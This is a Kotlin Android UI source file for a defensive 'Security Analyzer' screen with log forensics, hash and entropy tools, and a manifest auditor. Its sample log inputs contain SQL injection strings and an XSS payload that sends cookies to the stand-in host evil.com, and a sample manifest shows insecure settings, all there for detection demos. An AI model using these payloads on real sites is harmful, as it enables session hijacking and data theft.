package com.example.ui.screens

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.widget.Toast
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Android
import androidx.compose.material.icons.filled.BugReport
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Key
import androidx.compose.material.icons.filled.NetworkCheck
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Storage
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.ScrollableTabRow
import androidx.compose.material3.Surface
import androidx.compose.material3.Tab
import androidx.compose.material3.TabRow
import androidx.compose.material3.TabRowDefaults
import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.example.ui.components.ActionPill
import com.example.ui.components.CodeBlockView
import com.example.ui.components.CopyableSnippet
import com.example.ui.components.CyberCard
import com.example.ui.components.CyberHeader
import com.example.ui.components.MetricBox
import com.example.ui.components.SeverityBadge
import com.example.ui.theme.CyberAmber
import com.example.ui.theme.CyberBlack
import com.example.ui.theme.CyberBorder
import com.example.ui.theme.CyberBorderMuted
import com.example.ui.theme.CyberCrimson
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberDarkSurface
import com.example.ui.theme.CyberGreen
import com.example.ui.theme.CyberSky
import com.example.ui.theme.CyberSurfaceVariant
import com.example.ui.theme.CyberTextCode
import com.example.ui.theme.CyberTextMuted
import com.example.ui.theme.CyberTextPrimary
import com.example.ui.theme.CyberTextSecondary
import com.example.ui.viewmodel.CyberViewModel
import kotlinx.coroutines.delay

@Composable
fun AnalyzeScreen(viewModel: CyberViewModel) {
    var selectedSubTab by remember { mutableIntStateOf(0) }
    val tabTitles = listOf("LOG FORENSICS", "HASH & CRYPTO", "APK MANIFEST")

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(CyberBlack)
            .testTag("analyze_screen")
    ) {
        CyberHeader(
            title = "SECURITY ANALYZER",
            subtitle = "Log event forensics, cryptographic verification, and APK auditing",
            badgeText = "STATIC INSPECTOR"
        )

        TabRow(
            selectedTabIndex = selectedSubTab,
            containerColor = CyberDarkSurface,
            contentColor = CyberCyan,
            indicator = { tabPositions ->
                TabRowDefaults.SecondaryIndicator(
                    Modifier.tabIndicatorOffset(tabPositions[selectedSubTab]),
                    color = CyberCyan,
                    height = 2.dp
                )
            },
            divider = {
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(1.dp)
                        .background(CyberBorder)
                )
            }
        ) {
            tabTitles.forEachIndexed { index, title ->
                Tab(
                    selected = selectedSubTab == index,
                    onClick = { selectedSubTab = index },
                    text = {
                        Text(
                            text = title,
                            style = MaterialTheme.typography.labelSmall,
                            color = if (selectedSubTab == index) CyberCyan else CyberTextMuted,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = if (selectedSubTab == index) FontWeight.Bold else FontWeight.Normal,
                            fontSize = 11.sp
                        )
                    }
                )
            }
        }

        when (selectedSubTab) {
            0 -> LogAnalysisTab(viewModel)
            1 -> HashCryptoTab(viewModel)
            2 -> ApkManifestTab(viewModel)
        }
    }
}

@Composable
fun LogAnalysisTab(viewModel: CyberViewModel) {
    val analysisResult by viewModel.logAnalysisResult.collectAsStateWithLifecycle()
    var logInput by remember {
        mutableStateOf(
            """Oct 24 14:22:01 server sshd[4102]: Failed password for invalid user admin from 192.168.1.105 port 54210 ssh2
Oct 24 14:22:04 server sshd[4105]: Failed password for invalid user admin from 192.168.1.105 port 54212 ssh2
Oct 24 14:22:07 server sshd[4109]: Failed password for root from 192.168.1.105 port 54218 ssh2
Oct 24 14:22:15 server nginx[1204]: 10.0.0.45 - - [24/Oct/2026:14:22:15] "GET /login?user=admin' UNION SELECT 1,password FROM users-- HTTP/1.1" 403
Oct 24 14:23:00 server sudo: pam_unix(sudo:auth): authentication failure; logname=operator uid=1000 euid=0 tty=/dev/pts/1 ruser=operator rhost= user=root"""
        )
    }

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 10.dp, bottom = 90.dp),
        verticalArrangement = Arrangement.spacedBy(10.dp)
    ) {
        item {
            Text(
                text = "PASTE LOG STREAM FOR ANOMALY & IP EXTRACTION",
                style = MaterialTheme.typography.labelSmall,
                color = CyberTextMuted,
                fontFamily = FontFamily.Monospace,
                fontSize = 10.sp,
                letterSpacing = 1.sp
            )
        }

        item {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(18.dp),
                color = CyberSurfaceVariant,
                border = BorderStroke(1.dp, CyberBorder)
            ) {
                OutlinedTextField(
                    value = logInput,
                    onValueChange = { logInput = it },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(130.dp)
                        .padding(4.dp)
                        .testTag("log_input_field"),
                    placeholder = { Text("Paste syslog, auth.log, or web server logs...", color = CyberTextMuted, fontFamily = FontFamily.Monospace, fontSize = 12.sp) },
                    textStyle = MaterialTheme.typography.bodySmall.copy(
                        color = CyberTextPrimary,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 11.5.sp
                    ),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color.Transparent,
                        unfocusedBorderColor = Color.Transparent,
                        cursorColor = CyberCyan,
                        focusedContainerColor = Color.Transparent,
                        unfocusedContainerColor = Color.Transparent
                    )
                )
            }
        }

        item {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                ActionPill(text = "SSH Attack") {
                    logInput = """Failed password for root from 203.0.113.19 port 44102 ssh2
Failed password for root from 203.0.113.19 port 44104 ssh2
Failed password for invalid user oracle from 203.0.113.19 port 44108 ssh2
Failed password for root from 203.0.113.19 port 44112 ssh2"""
                }
                ActionPill(text = "SQLi & XSS Web Probe") {
                    logInput = """GET /api/items?id=1' UNION SELECT username,password FROM users-- HTTP/1.1 200
GET /search?q=<script>document.location='http://evil.com/'+document.cookie</script> HTTP/1.1 400
POST /api/v1/auth/login 198.51.100.22 - - "admin' or '1'='1" 401"""
                }
                ActionPill(text = "Privilege Escalation") {
                    logInput = """Oct 24 18:02:11 host sudo: pam_unix(sudo:auth): authentication failure; logname=nobody uid=65534 euid=0
Oct 24 18:02:15 host kernel: traps: exploit[9481] general protection fault ip:7f4931 sp:7ffe33"""
                }
            }
        }

        item {
            Button(
                onClick = { viewModel.analyzeLogs(logInput) },
                colors = ButtonDefaults.buttonColors(containerColor = CyberCyan, contentColor = Color(0xFF000000)),
                shape = CircleShape,
                modifier = Modifier.fillMaxWidth().height(42.dp).testTag("run_log_analysis_button")
            ) {
                Icon(imageVector = Icons.Default.PlayArrow, contentDescription = null, modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(6.dp))
                Text("PARSE LOG STREAM & EXTRACT ANOMALIES", fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 11.sp)
            }
        }

        if (analysisResult != null) {
            val res = analysisResult!!
            item {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    MetricBox(
                        title = "Lines",
                        value = "${res["totalLines"]}",
                        accentColor = CyberSky,
                        modifier = Modifier.weight(1f)
                    )
                    MetricBox(
                        title = "Failed Auth",
                        value = "${res["failedLoginCount"]}",
                        accentColor = CyberCrimson,
                        modifier = Modifier.weight(1f)
                    )
                    MetricBox(
                        title = "Injections",
                        value = "${(res["sqliCount"] as? Int ?: 0) + (res["xssCount"] as? Int ?: 0)}",
                        accentColor = CyberAmber,
                        modifier = Modifier.weight(1f)
                    )
                    MetricBox(
                        title = "Unique IPs",
                        value = "${res["uniqueIps"]}",
                        accentColor = CyberGreen,
                        modifier = Modifier.weight(1f)
                    )
                }
            }

            item {
                CyberCard(borderColor = CyberCyan) {
                    Column {
                        Text(
                            text = "FORENSIC LOG SUMMARY",
                            style = MaterialTheme.typography.titleSmall,
                            color = CyberCyan,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "THREAT RATING: ${res["threatScore"]}",
                            style = MaterialTheme.typography.bodyMedium,
                            color = if (res["threatScore"].toString().contains("HIGH")) CyberCrimson else CyberGreen,
                            fontWeight = FontWeight.Bold,
                            fontFamily = FontFamily.Monospace
                        )
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(
                            text = "SUSPICIOUS INJECTION & AUTH EVENTS:",
                            style = MaterialTheme.typography.labelSmall,
                            color = CyberAmber,
                            fontFamily = FontFamily.Monospace
                        )
                        val suspicious = res["suspiciousEvents"] as? List<*> ?: emptyList<Any>()
                        if (suspicious.isNotEmpty()) {
                            for (s in suspicious) {
                                Text(
                                    text = "• $s",
                                    style = MaterialTheme.typography.bodySmall,
                                    color = CyberTextPrimary,
                                    fontFamily = FontFamily.Monospace
                                )
                            }
                        } else {
                            Text(
                                text = "No direct injection payloads flagged.",
                                style = MaterialTheme.typography.bodySmall,
                                color = CyberTextSecondary
                            )
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun HashCryptoTab(viewModel: CyberViewModel) {
    val hashes by viewModel.hashResults.collectAsStateWithLifecycle()
    val types by viewModel.identifiedHashTypes.collectAsStateWithLifecycle()
    val entropy by viewModel.entropyResult.collectAsStateWithLifecycle()

    var inputString by remember { mutableStateOf("DarkAvatar2026!#DefenseSecure") }

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 10.dp, bottom = 90.dp),
        verticalArrangement = Arrangement.spacedBy(10.dp)
    ) {
        item {
            Text(
                text = "ENTER TEXT OR HASH FOR INSTANT CRYPTO COMPUTATION",
                style = MaterialTheme.typography.labelSmall,
                color = CyberTextMuted,
                fontFamily = FontFamily.Monospace,
                fontSize = 10.sp,
                letterSpacing = 1.sp
            )
        }

        item {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(18.dp),
                color = CyberSurfaceVariant,
                border = BorderStroke(1.dp, CyberBorder)
            ) {
                OutlinedTextField(
                    value = inputString,
                    onValueChange = {
                        inputString = it
                        viewModel.computeHashesAndEntropy(it)
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 4.dp)
                        .testTag("hash_input_field"),
                    placeholder = { Text("Enter string or hash...", color = CyberTextMuted, fontFamily = FontFamily.Monospace, fontSize = 12.sp) },
                    textStyle = MaterialTheme.typography.bodyMedium.copy(
                        color = CyberTextPrimary,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 12.sp
                    ),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color.Transparent,
                        unfocusedBorderColor = Color.Transparent,
                        cursorColor = CyberCyan,
                        focusedContainerColor = Color.Transparent,
                        unfocusedContainerColor = Color.Transparent
                    )
                )
            }
        }

        item {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                ActionPill(text = "Compute Hashes") {
                    viewModel.computeHashesAndEntropy(inputString)
                }
                ActionPill(text = "Sample bcrypt") {
                    inputString = "\$2a\$12\$e8McV8QY6.RkP7.sJ6D5y.Qk78P4eB51Wc0K.4JqF3L6h9B1v2C3e"
                    viewModel.computeHashesAndEntropy(inputString)
                }
                ActionPill(text = "Sample MD5") {
                    inputString = "5d41402abc4b2a76b9719d911017c592"
                    viewModel.computeHashesAndEntropy(inputString)
                }
                ActionPill(text = "Sample SHA-256") {
                    inputString = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                    viewModel.computeHashesAndEntropy(inputString)
                }
            }
        }

        // Entropy & Strength HUD
        if (entropy.isNotEmpty()) {
            item {
                CyberCard(borderColor = CyberGreen) {
                    Column {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = "ENTROPY & BRUTE-FORCE RESISTANCE",
                                style = MaterialTheme.typography.labelSmall,
                                color = CyberGreen,
                                fontFamily = FontFamily.Monospace,
                                fontWeight = FontWeight.Bold
                            )
                            Text(
                                text = "${entropy["entropy"]}",
                                style = MaterialTheme.typography.titleMedium,
                                color = CyberCyan,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "STRENGTH RATING: ${entropy["strength"]}",
                            style = MaterialTheme.typography.bodyMedium,
                            color = CyberTextPrimary,
                            fontWeight = FontWeight.SemiBold
                        )
                        Text(
                            text = "ESTIMATED CRACK TIME: ${entropy["crackTime"]}",
                            style = MaterialTheme.typography.bodySmall,
                            color = CyberTextSecondary
                        )
                    }
                }
            }
        }

        // Identified Types
        if (types.isNotEmpty()) {
            item {
                CyberCard(borderColor = CyberSky) {
                    Column {
                        Text(
                            text = "IDENTIFIED HASH SIGNATURES",
                            style = MaterialTheme.typography.labelSmall,
                            color = CyberSky,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        for (t in types) {
                            Text(
                                text = "• $t",
                                style = MaterialTheme.typography.bodySmall,
                                color = CyberTextPrimary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }
                }
            }
        }

        // Calculated Hashes with Copyable Snippet
        if (hashes.isNotEmpty()) {
            item {
                Text(
                    text = "REAL-TIME CALCULATED CRYPTOGRAPHIC HASHES",
                    style = MaterialTheme.typography.labelSmall,
                    color = CyberTextMuted,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 10.sp,
                    letterSpacing = 1.sp
                )
            }

            items(hashes.entries.toList()) { (algo, hashVal) ->
                CopyableSnippet(
                    label = algo,
                    text = hashVal
                )
            }
        }
    }
}

@Composable
fun ApkManifestTab(viewModel: CyberViewModel) {
    val findings by viewModel.manifestFindings.collectAsStateWithLifecycle()
    var manifestXml by remember {
        mutableStateOf(
            """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.target.vulnerableapp">

    <application
        android:allowBackup="true"
        android:debuggable="true"
        android:usesCleartextTraffic="true"
        android:label="Target App">

        <activity
            android:name=".AuthTokenProviderActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="com.target.vulnerableapp.AUTH_TOKEN" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
    </application>
</manifest>"""
        )
    }

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 10.dp, bottom = 90.dp),
        verticalArrangement = Arrangement.spacedBy(10.dp)
    ) {
        item {
            Text(
                text = "PASTE AndroidManifest.xml TO AUDIT PERMISSIONS & COMPONENT FLAWS",
                style = MaterialTheme.typography.labelSmall,
                color = CyberTextMuted,
                fontFamily = FontFamily.Monospace,
                fontSize = 10.sp,
                letterSpacing = 1.sp
            )
        }

        item {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(18.dp),
                color = CyberSurfaceVariant,
                border = BorderStroke(1.dp, CyberBorder)
            ) {
                OutlinedTextField(
                    value = manifestXml,
                    onValueChange = { manifestXml = it },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(140.dp)
                        .padding(4.dp)
                        .testTag("manifest_input_field"),
                    textStyle = MaterialTheme.typography.bodySmall.copy(
                        color = CyberTextPrimary,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 11.5.sp
                    ),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color.Transparent,
                        unfocusedBorderColor = Color.Transparent,
                        cursorColor = CyberCyan,
                        focusedContainerColor = Color.Transparent,
                        unfocusedContainerColor = Color.Transparent
                    )
                )
            }
        }

        item {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                ActionPill(text = "Cleartext & Debuggable") {
                    manifestXml = """<application android:allowBackup="true" android:debuggable="true" android:usesCleartextTraffic="true"/>"""
                }
                ActionPill(text = "Exported Provider") {
                    manifestXml = """<provider android:name=".UserDataProvider" android:authorities="com.app.provider" android:exported="true"/>"""
                }
                ActionPill(text = "Insecure Deep Link") {
                    manifestXml = """<activity android:name=".OAuthCallbackActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <data android:scheme="http" android:host="app.callback"/>
    </intent-filter>
</activity>"""
                }
            }
        }

        item {
            Button(
                onClick = { viewModel.auditAndroidManifest(manifestXml) },
                colors = ButtonDefaults.buttonColors(containerColor = CyberCyan, contentColor = Color(0xFF000000)),
                shape = CircleShape,
                modifier = Modifier.fillMaxWidth().height(42.dp).testTag("run_manifest_audit_button")
            ) {
                Icon(imageVector = Icons.Default.PlayArrow, contentDescription = null, modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(6.dp))
                Text("AUDIT ANDROID MANIFEST CONFIG", fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 11.sp)
            }
        }

        if (findings.isNotEmpty()) {
            item {
                Text(
                    text = "AUDIT FINDINGS (${findings.size})",
                    style = MaterialTheme.typography.labelMedium,
                    color = CyberTextMuted,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 10.sp,
                    letterSpacing = 1.sp
                )
            }

            items(findings) { finding ->
                CyberCard(
                    borderColor = if (finding.severity == com.example.data.model.AuditSeverity.CRITICAL) CyberCrimson else CyberAmber
                ) {
                    Column {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = finding.title,
                                style = MaterialTheme.typography.titleSmall,
                                color = CyberCyan,
                                fontWeight = FontWeight.Bold
                            )
                            SeverityBadge(severity = finding.severity)
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "LOCATION: ${finding.location}",
                            style = MaterialTheme.typography.labelSmall,
                            color = CyberSky,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 10.sp
                        )
                        Spacer(modifier = Modifier.height(2.dp))
                        Text(
                            text = finding.problem,
                            style = MaterialTheme.typography.bodySmall,
                            color = CyberTextPrimary,
                            fontSize = 11.5.sp
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "REMEDIATION: ${finding.secureFix}",
                            style = MaterialTheme.typography.bodySmall,
                            color = CyberGreen,
                            fontSize = 11.5.sp
                        )
                    }
                }
            }
        }
    }
}
